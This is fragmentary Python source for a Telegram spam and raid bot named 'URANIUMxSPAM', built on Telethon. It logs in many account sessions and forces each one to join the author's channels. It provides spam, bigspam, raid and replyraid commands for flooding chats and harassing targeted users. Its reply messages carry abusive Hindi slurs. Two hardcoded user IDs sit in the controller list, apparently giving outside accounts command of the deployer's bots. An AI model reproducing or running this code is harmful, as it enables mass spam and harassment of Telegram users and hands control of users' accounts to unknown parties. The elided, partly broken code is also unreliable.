...
SMEX_USERS = [5267349380 , 5284419699]
for x in SUDO_USERS: 
    SMEX_USERS.append(x)
    
async def start_uranium():
    global idk
    global ydk
    global wdk
    global sdk
    ...
    if smex:
        ...
        try:
            ...
            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await idk(functions.channels.JoinChannelRequest(channel="URANIUM_UPDATES"))
    ...
    if smexx:
        ...
        try:
            ...
            await ydk.start()
            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if smexxx:
        ...
        try:
            ...
            await  wdk.start()
            await wdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await wdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await wdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await wdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if smexxxx:
        ...
        try:
            ...
            await hdk.start()
            await hdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await hdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await hdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await hdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if smexxxxx:
        ...
        try:
            ...
            await sdk.start()
            await sdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await sdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await sdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await sdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if sixth:
        ...
        try:
            ...
            await adk.start()
            await adk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await adk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await adk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await adk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if seven:
        ...
        try:
            ...
            await bdk.start()
            await bdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await bdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await bdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await bdk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if ninth:
        ...
        try:
            ...
            await ddk.start()
            await ddk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ddk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ddk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ddk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if tenth:
        ...
        try:
            ...
            await edk.start()
            await edk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await edk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await edk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await edk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if eleve:
        ...
        try:
            ...
            await vkk.start()
            await vkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await vkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await vkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await vkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if twelv:
        ...
        try:
            ...
            await kkk.start()
            await kkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await kkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await kkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await kkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if thirt:
        ...
        try:
            ...
            await lkk.start()
            await lkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await lkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await lkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await lkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if forte:
        ...
        try:
            ...
            await mkk.start()
            await mkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await mkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await mkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await mkk(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if fifth:
        ...
        try:
            ...
            await sid.start()
            await sid(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await sid(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await sid(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await sid(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
    ...
    if sieee:
        ...
        try:
            ...
            await shy(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await shy(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await shy(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await shy(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if seeee:
        ...
        try:
            ...
            await aan(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await aan(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await aan(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await aan(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if eieee:
        ...
        try:
            ...
            await ake(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ake(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ake(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await ake(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if nieee:
        ...
        try:
            ...
            await eel(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await eel(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await eel(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await eel(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if gandu:
        ...
        try:
            ...
            await khu(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await khu(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await khu(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await khu(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if ekish:
        ...
        try:
            ...
            await shi(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await shi(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await shi(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await shi(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if baish:
        ...
        try:
            ...
            await yaa(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await yaa(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await yaa(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await yaa(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if teish:
        ...
        try:
            ...
            await dav(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await dav(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await dav(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await dav(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if tfour:
        ...
        try:
            ...
            await raj(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await raj(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await raj(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await raj(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
    ...
    if tfive:
        ...
        try:
            ...
            await put(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await put(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await put(functions.channels.JoinChannelRequest(channel=" @URANIUM_CLASHERS"))
            await put(functions.channels.JoinChannelRequest(channel=" @URANIUM_UPDATES"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
...
loop.run_until_complete(start_uranium())       
...
async def _(e):
    ...
    if e.sender_id in SMEX_USERS:
        uranium = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = uranium[0]
            text = "Joining..."
            ...
            try:
                ...
                await event.edit("𝐒𝐔𝐂𝐂𝐄𝐒𝐅𝐔𝐋𝐋𝐘 𝐉𝐎𝐈𝐍𝐄𝐃 ✅")
            except Exception as e:
...
async def _(e):
    ...
    if e.sender_id in SMEX_USERS:
        uranium = ("".leave(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) == 7:
            bc = uranium[0]
            bc = int(bc)
            text = "𝐂𝐇𝐀𝐋𝐓𝐀 𝐇𝐔 𝐁𝐒𝐃𝐊 🤘🔥"
...
async def spam(e):
    ...
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        smex = await e.get_reply_message()
        uranium = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        uraniumsexy = uranium[1:]
        if len(uraniumsexy) == 2:
            message = str(uraniumsexy[1])
            counter = int(uraniumsexy[0])
            sleeptime = float(uranium[0])
            for _ in range(counter):
    ...
    if e.sender_id in SMEX_USERS:
        ...
        if len(e.text) > 12:
            ...
            try:
                ...
                pass
            text = "𝐇𝐈𝐋𝐀 𝐊𝐄 𝐒𝐎𝐉𝐀 𝐋𝐀𝐖𝐃𝐄 𝐂𝐀𝐇𝐋𝐀 𝐉𝐀 𝐌𝐀𝐅 𝐊𝐄𝐘𝐀💥"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
...
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = " ⚔️ 𝐔𝐑𝐀𝐍𝐈𝐔𝐌𝐱𝐒𝐏𝐀𝐌 𝐁𝐎𝐓💫\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\n𝐔𝐒𝐄𝐑𝐁𝐎𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 ☞︎︎︎\n.bio\n.join\n.pjoin\n.leave\n𝐒𝐏𝐀𝐌 𝐁𝐎𝐓𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 ☞︎︎︎\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
       await e.reply(text, parse_mode=None, link_preview=None )
...
text = """
𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐒 ❤️ 𝐘𝐎𝐔𝐑 𝐅𝐀𝐒𝐓𝐄𝐒𝐓 𝐒𝐌𝐎𝐎𝐓𝐇𝐄𝐒𝐓 𝐀𝐍𝐃 𝐏𝐎𝐖𝐄𝐑𝐅𝐔𝐋𝐋 𝐔𝐑𝐀𝐍𝐈𝐔𝐌𝐱𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘🥳🥳🥳 """

print(text)
print("")
print("💫🔥𝐔𝐑𝐀𝐍𝐈𝐔𝐌𝐱𝐒𝐏𝐀𝐌 𝐁𝐎𝐓!!")
